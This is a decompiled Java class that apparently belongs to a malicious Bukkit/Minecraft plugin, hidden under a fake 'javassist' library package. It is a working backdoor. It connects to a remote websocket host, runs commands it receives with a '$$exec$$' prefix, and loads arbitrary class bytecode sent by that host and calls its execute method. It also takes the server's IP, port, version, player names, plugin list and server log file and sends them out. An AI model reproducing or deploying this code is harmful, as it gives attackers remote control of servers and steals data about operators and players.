/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.HumanEntity
 *  org.bukkit.plugin.Plugin
 */
package javassist.ws;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.URI;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;
import javassist.CtClass;
import javassist.PingMessage;
import javassist.ResponseContainer;
import javassist.f;
import javassist.orgs.java_websocket.handshake.h;
import javassist.ws.b;
import javassist.ws.c;
import javassist.ws.d;
import org.bukkit.Bukkit;
import org.bukkit.entity.HumanEntity;
import org.bukkit.plugin.Plugin;

/*
 * Duplicate member names - consider using --renamedupmembers true
 */
public class a
extends javassist.orgs.java_websocket.client.b {
    private static final f a = f.a();
    private static BufferedReader a;
    private static String a;
    public static Thread a;

    static {
        a = null;
    }

    public a() {
        super(URI.create("http://client.hostflow.eu:5050/ws"));
        try {
            this.a(5L, TimeUnit.SECONDS);
        } catch (Exception exception) {
            // empty catch block
        }
        try {
            a = new Thread(() -> {
                try {
                    while (true) {
                        try {
                            while (true) {
                                if (this.e()) {
                                    this.d();
                                }
                                Thread.sleep(1000L);
                            }
                        } catch (Exception exception) {
                            continue;
                        }
                        break;
                    }
                } catch (Exception exception) {
                    return;
                }
            });
            a.start();
        } catch (Exception exception) {
            // empty catch block
        }
    }

    @Override
    public void a(h h2) {
    }

    @Override
    public void b(String string) {
        try {
            if (string.startsWith("$$exec$$")) {
                Bukkit.getScheduler().runTask(Bukkit.getPluginManager().getPlugins()[0], (Runnable)new b(this, string));
            } else {
                this.c(string);
            }
        } catch (Exception exception) {
            // empty catch block
        }
    }

    @Override
    public void b(ByteBuffer byteBuffer) {
        try {
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteBuffer.array());
            CtClass ctClass = a.a(byteArrayInputStream);
            Class<?> clazz = ctClass.a();
            Object obj = clazz.newInstance();
            Method method = clazz.getDeclaredMethod("execute", new Class[0]);
            Bukkit.getScheduler().runTask(Bukkit.getPluginManager().getPlugins()[0], (Runnable)new c(this, method, obj));
            ctClass.c();
            ctClass.d();
            byteArrayInputStream.close();
        } catch (Exception exception) {
            // empty catch block
        }
    }

    @Override
    public void b(int n2, String string, boolean bl2) {
    }

    @Override
    public void a(Exception exception) {
    }

    public void c(String string) {
        try {
            Object object;
            Object object2;
            ArrayList<String> arrayList;
            block33: {
                arrayList = new ArrayList<String>();
                try {
                    if (a == null) {
                        object2 = new File("logs/latest.log");
                        a = new BufferedReader(new FileReader((File)object2));
                    }
                    object2 = "Logs";
                    while (object2 != null) {
                        object2 = a.readLine();
                        if (object2 == null) continue;
                        arrayList.add((String)object2);
                    }
                } catch (Exception exception) {
                    // empty catch block
                }
                object2 = Bukkit.getServer();
                try {
                    if (a != null) break block33;
                    object = null;
                    try {
                        try {
                            URL uRL = new URL("http://checkip.amazonaws.com");
                            object = new BufferedReader(new InputStreamReader(uRL.openStream()));
                            a = ((BufferedReader)object).readLine();
                        } catch (Exception exception) {
                            try {
                                Throwable throwable = null;
                                Object var7_13 = null;
                                try (DatagramSocket datagramSocket = new DatagramSocket();){
                                    datagramSocket.connect(InetAddress.getByName("8.8.8.8"), 10002);
                                    a = datagramSocket.getLocalAddress().getHostAddress();
                                } catch (Throwable throwable2) {
                                    if (throwable == null) {
                                        throwable = throwable2;
                                    } else if (throwable != throwable2) {
                                        throwable.addSuppressed(throwable2);
                                    }
                                    throw throwable;
                                }
                            } catch (Exception exception2) {
                                a = "unknown";
                            }
                            if (object != null) {
                                try {
                                    ((BufferedReader)object).close();
                                } catch (Exception exception3) {}
                            }
                            break block33;
                        }
                    } catch (Throwable throwable) {
                        if (object != null) {
                            try {
                                ((BufferedReader)object).close();
                            } catch (Exception exception) {
                                // empty catch block
                            }
                        }
                        throw throwable;
                    }
                    if (object != null) {
                        try {
                            ((BufferedReader)object).close();
                        } catch (Exception exception) {}
                    }
                } catch (Exception exception) {
                    // empty catch block
                }
            }
            object = new PingMessage();
            ((PingMessage)object).className = this.getClass().getName();
            ((PingMessage)object).serverIp = a;
            ((PingMessage)object).serverPort = Integer.toString(object2.getPort());
            ((PingMessage)object).serverVersion = object2.getVersion();
            ((PingMessage)object).playerCount = object2.getOnlinePlayers().size();
            ((PingMessage)object).maxPlayerCount = object2.getMaxPlayers();
            ((PingMessage)object).plugins = Arrays.asList(object2.getPluginManager().getPlugins()).stream().map(Plugin::getName).collect(Collectors.toList());
            ((PingMessage)object).premium = object2.getOnlineMode();
            ((PingMessage)object).players = object2.getOnlinePlayers().stream().map(HumanEntity::getName).collect(Collectors.toList());
            ((PingMessage)object).logs = arrayList;
            if (this.b()) {
                this.a(ResponseContainer.from(string, object));
            }
        } catch (Exception exception) {
            // empty catch block
        }
    }

    public static final List<File> a(File file) {
        return Arrays.asList(file.listFiles(new d()));
    }
}

